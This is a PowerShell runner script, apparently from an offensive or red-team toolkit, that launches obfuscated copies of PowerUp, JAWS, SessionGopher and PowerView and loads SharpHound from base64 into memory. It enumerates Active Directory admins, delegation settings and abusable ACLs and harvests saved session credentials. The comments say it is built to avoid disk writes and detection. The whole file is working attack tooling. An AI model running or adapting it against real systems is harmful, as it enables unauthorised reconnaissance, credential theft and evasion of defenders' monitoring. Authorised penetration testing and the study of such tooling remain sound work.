# Invoke-Suite.ps1 - one-click runner for the pre-staged enum tools (fileless where possible)
# Tools live in ..\tools\ relative to this script. Output goes to ..\out\
param(
    [ValidateSet('All','PowerUp','JAWS','SessionGopher','SharpHound','PowerView')]
    [string]$Tool = 'All',
    [string]$Domain = $env:USERDNSDOMAIN
)
$ErrorActionPreference = 'Continue'
$root = Split-Path $PSScriptRoot -Parent
$tools = Join-Path $root 'tools'
$out = Join-Path $root 'out'
if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out | Out-Null }
$log = Join-Path $out ("suite-{0:yyyyMMdd-HHmmss}.log" -f (Get-Date))
Start-Transcript -Path $log | Out-Null

function Run-PowerUp {
    Write-Host '[RUN] PowerUp Invoke-AllChecks (obfuscated)' -ForegroundColor Cyan
    . (Join-Path $tools '..\tools-obf\PowerUp.ps1')
    Invoke-AllChecks
}
function Run-Jaws {
    Write-Host '[RUN] JAWS enum (obfuscated)' -ForegroundColor Cyan
    . (Join-Path $tools '..\tools-obf\jaws-enum.ps1')
}
function Run-SessionGopher {
    Write-Host '[RUN] SessionGopher (obfuscated)' -ForegroundColor Cyan
    . (Join-Path $tools '..\tools-obf\SessionGopher.ps1')
    Invoke-SessionGopher -All
}
function Run-SharpHound {
    Write-Host '[RUN] SharpHound via base64 -> memory (no disk, no known wrapper)' -ForegroundColor Cyan
    . (Join-Path $PSScriptRoot 'InMem-Asm.ps1')
    $b64 = Join-Path $tools '..\tools-obf\SharpHound.exe.b64'
    $zip = Join-Path $out ("bh-{0:yyyyMMdd}.zip" -f (Get-Date))
    Invoke-AsmFromB64 -B64Path $b64 -AsmArgs @('-c','All','-d',$Domain,'--outputdirectory',$out,'--zipfilename',(Split-Path $zip -Leaf))
}
function Run-PowerView {
    Write-Host '[RUN] PowerView quick domain view (obfuscated)' -ForegroundColor Cyan
    . (Join-Path $tools '..\tools-obf\PowerView.ps1')
    Get-Domain
    Get-DomainController
    Get-DomainTrust
    Get-DomainUser -AdminCount | Select-Object samaccountname,memberof
    Get-DomainComputer -Unconstrained | Select-Object dnshostname
    Get-DomainComputer -TrustedToAuth | Select-Object dnshostname
    Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|ExtendedRight' } | Select-Object ObjectDN,ObjectAceType,ActiveDirectoryRights,SecurityIdentifier
}

switch ($Tool) {
    'PowerUp'      { Run-PowerUp }
    'JAWS'         { Run-Jaws }
    'SessionGopher'{ Run-SessionGopher }
    'SharpHound'   { Run-SharpHound }
    'PowerView'    { Run-PowerView }
    'All'          { Run-PowerUp; Run-Jaws; Run-SessionGopher; Run-PowerView }
}
Stop-Transcript
Write-Host "[+] log saved to $log"
